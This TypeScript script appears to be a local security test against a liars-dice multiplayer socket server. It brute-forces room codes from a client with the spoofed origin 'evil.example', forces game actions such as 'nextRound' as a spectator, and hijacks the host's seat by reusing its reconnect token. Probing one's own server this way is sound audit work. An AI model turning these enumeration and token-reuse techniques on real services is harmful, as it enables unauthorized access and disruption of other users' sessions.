import { createServer } from 'node:http';
import { Server } from '../../../apps/parlor/node_modules/socket.io/dist/index.js';
import { io as ioc } from '../../../apps/parlor/node_modules/socket.io-client/build/esm-debug/index.js';
import { buildSocketServerOptions } from '../../../packages/multiplayer/src/server.ts';
import { setupParlorSocketHandlers } from '../../../apps/parlor/src/lib/server/socketServer.ts';

const http = createServer();
const io = new Server(http, buildSocketServerOptions());
setupParlorSocketHandlers(io as any);
await new Promise<void>((r) => http.listen(0, r));
const port = (http.address() as any).port;
const url = `http://localhost:${port}`;
const mk = (extra: any = {}) => ioc(url, { transports: ['websocket'], ...extra });
const ack = (s: any, ev: string, ...args: any[]) => new Promise<any[]>((r) => s.emit(ev, ...args, (...res: any[]) => r(res)));

// host + 1 bot liars dice game
const host = mk(); await new Promise((r) => host.on('connect', r));
const [created] = await ack(host, 'lobby:create', 'Host');
console.log('created', created.roomCode);
await ack(host, 'lobby:selectGame', 'liars-dice');
await ack(host, 'lobby:addBot');
await ack(host, 'lobby:ready', true);
const hostStates: any[] = []; host.on('game:state', (s: any) => hostStates.push(s));

// attacker from evil origin, websocket transport
const atk = mk({ extraHeaders: { Origin: 'https://evil.example' } });
await new Promise((r) => atk.on('connect', r));
let lobbyStates: any[] = []; atk.on('lobby:state', (p: any) => lobbyStates.push(p));
const t0 = Date.now(); let found: string[] = [];
const CH = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
// enumerate 20000 codes incl. the real one
const codes: string[] = [];
for (let i = 0; i < 20000; i++) { let c=''; let n=i; for (let k=0;k<4;k++){c+=CH[n%32]; n=Math.floor(n/32);} codes.push(c); }
codes.push(created.roomCode);
await Promise.all(codes.map(async (c) => { const [ok] = await ack(atk, 'lobby:spectate', c); if (ok) found.push(c); }));
console.log(`spectate-probed ${codes.length} codes in ${Date.now()-t0}ms, found`, found);

const atkStates: any[] = []; atk.on('game:state', (s: any) => atkStates.push(s));
await ack(host, 'lobby:startGame');
await new Promise((r) => setTimeout(r, 300));
console.log('lobby:state seen by spectator (player ids):', JSON.stringify(lobbyStates.at(-1)));
// spectator forces nextRound — wait until challenge phase
let errs: string[] = []; atk.on('error', (m: string) => errs.push(m));
atk.emit('game:action', { type: 'challenge' });
atk.emit('game:action', { type: 'bid', quantity: 1, faceValue: 2 });
await new Promise((r) => setTimeout(r, 200));
console.log('spectator action errors (internal msgs):', errs);
// spectator nextRound attempt: put engine into challenge phase via host when its turn
const before = hostStates.at(-1);
console.log('host phase', before?.phase, 'round', before?.round);

// get host to challenge state
const waitFor = async (pred: () => boolean, ms = 8000) => { const t = Date.now(); while (!pred() && Date.now() - t < ms) await new Promise(r => setTimeout(r, 50)); return pred(); };
for (let i = 0; i < 6; i++) {
  await waitFor(() => hostStates.at(-1)?.isMyTurn);
  const st = hostStates.at(-1);
  if (st.currentBid) { host.emit('game:action', { type: 'challenge' }); break; }
  host.emit('game:action', { type: 'bid', quantity: st.minimumBid.quantity, faceValue: st.minimumBid.faceValue });
  await new Promise(r => setTimeout(r, 300));
}
await waitFor(() => hostStates.at(-1)?.phase === 'challenge');
const r0 = hostStates.at(-1).round; const tc = Date.now();
console.log('host in challenge phase round', r0, 'revealedDice keys', Object.keys(hostStates.at(-1).revealedDice || {}).length);
atk.emit('game:action', { type: 'nextRound' });
await waitFor(() => hostStates.at(-1)?.round > r0, 2000);
console.log('after SPECTATOR nextRound: round', hostStates.at(-1).round, 'phase', hostStates.at(-1).phase, 'elapsed ms', Date.now() - tc);

// token reuse: second socket reconnects with host's token while host still connected
const thief = mk(); await new Promise(r => thief.on('connect', r));
const thiefStates: any[] = []; thief.on('game:state', (s: any) => thiefStates.push(s));
const [ok1] = await ack(thief, 'player:reconnect', created.roomCode, created.playerId, created.reconnectToken);
const [ok2] = await ack(thief, 'player:reconnect', created.roomCode, created.playerId, created.reconnectToken);
await new Promise(r => setTimeout(r, 300));
console.log('thief reconnect ok', ok1, 'reuse ok', ok2, 'thief got host view myDice', thiefStates.at(-1)?.myDice, 'host still connected', host.connected);
// wrong token
const [bad] = await ack(thief, 'player:reconnect', created.roomCode, created.playerId, 'x');
console.log('wrong token', bad);
// error string leakage with malformed payload
const errs2: string[] = []; host.on('error', (m: string) => errs2.push(m));
io.close(); process.exit(0);
